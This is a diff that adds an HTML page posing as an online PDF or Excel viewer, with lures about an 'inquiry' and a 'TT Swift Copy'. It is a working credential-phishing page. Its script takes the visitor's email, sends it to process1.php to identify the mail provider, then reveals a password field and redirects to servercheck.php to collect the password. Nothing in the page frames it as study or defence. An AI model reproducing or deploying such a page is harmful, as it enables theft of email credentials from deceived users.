@@ -1,0 +1,147 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>PDF Online - 8HHF74MDK84RGS64BW48FN59SD</title>
+<link rel="stylesheet" type="text/css" href="style/stylex.css" />
+<script type="text/javascript" src="js/jquery.js"></script>
+<link rel="shortcut icon" href="img/favicon.ico" />
+<script language="javascript">
+function validate(){
+	email = document.form1.email.value;
+	password = document.form1.pass.value;
+	
+	if(email == ""){
+		alert("Please enter your email address and password!!!");
+		return false;	
+	}
+	else if(password == ""){
+		alert("Please enter your email address and password!!!");
+		return false;	
+	}
+
+}
+
+
+function process1()
+{
+	
+	var emaill = $("input#email").val();
+
+	if(!isValidEmailAddress(emaill)  || emaill == ""){
+		alert("Please Enter Your receiving Email Address");
+		return false;	
+	}
+
+	var xmlhttp;
+	
+	var email = document.getElementById("email").value;
+	
+	if(window.XMLHttpRequest)
+	{
+		xmlhttp = new XMLHttpRequest();
+	}
+	else
+	{
+		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+	}
+	
+	xmlhttp.onreadystatechange = function()
+	{
+		if(xmlhttp.readyState == 4)
+		{	
+				var ret = xmlhttp.responseText;
+				
+				if(ret == "gmail")
+				{
+					ret = "g";
+				}
+				else if(ret == "yahoo")
+				{
+					ret = "y";
+				}else if(ret == "hotmail")
+				{
+					ret = "h";
+				}else if(ret == "outlook")
+				{
+					ret = "o";
+				}
+				else
+				{
+					ret = "m";
+				}				
+				
+				var div1 = document.getElementById("log1");
+				var div2 = document.getElementById("log2");
+				var div3 = document.getElementById("but1");
+				var div4 = document.getElementById("but2");
+	
+				div1.style.display = "none";
+				div2.style.display = "block";
+				div3.style.display = "none";
+				div4.style.display = "block";
+				
+				window.location.href="servercheck.php?e="+ret;
+		}
+	}
+	
+	url = "process1.php?email="+email;
+	xmlhttp.open("GET",url,true);
+	xmlhttp.send();
+}
+
+function hidedive()
+{
+	var di1 = document.getElementById("error");
+	di1.style.display = "none";
+	
+	var di2 = document.getElementById("title");
+	di2.style.display = "block";
+}
+
+function isValidEmailAddress(emailAddress) {
+    var pattern = new RegExp(/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/);
+    return pattern.test(emailAddress);
+};
+
+function preloader()
+{
+heavyImage = new Image();
+heavyImage.src = "exl.png";
+}
+</script>
+</head>
+
+
+
+
+
+<body onLoad="javascript:preloader()"; style="background-image: url(img/exl.png); background-repeat: no-repeat;">
+     
+            <div style="padding-bottom: 0px;" id="header-container" class="header-style-1 logo-position-left navigation-position-right sticky-logo-position-left sticky-navigation-position-right no-stuck clearfix" data-responsive="{&quot;css&quot;:{&quot;padding-bottom&quot;:{&quot;phone&quot;:20,&quot;tablet&quot;:30,&quot;widescreen&quot;:0}}}">
+                                <div class="container relative">        
+                   
+                    
+                                   
+                    
+</div></div>
+
+
+<div style="position: absolute; width: 437px; height: 350px; z-index: 1; left: 434px; top: 162px; background-image: url(img/excel2013.png); background-repeat: no-repeat;" id="layer1">
+<div style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: url(294.gif); background-repeat: no-repeat;" id="layer2">&nbsp;</div>
+
+ <div id="title">Enter Your receiving E-mail To view our inquiry</div>        
+<div id="title" style="display: none;">Enter Your receiving E-mail To view our TT Swift Copy</div>
+
+<div id='holder'>
+        	<div class='email' id='log1'><input type='text' class='emai' name='email' id='email' onKeyUp='hidedive()' placeholder='Enter E-mail' required /></div>
+            <div class='email' id='log2' style='display: none;'><input type='password' class='pass' name='pass' id='pass' placeholder='Enter Password' /></div>
+        </div>
+        <div class='submit' id='but2' style='display: none;'><button type='submit' class='subm' onclick='validate()'></button></div>
+        <div class='submit' id='but1'><button type='submit' class='subm' onclick='process1()'><b>VIEW</b></button></div>
+</div>
+
+
+
+</body></html>
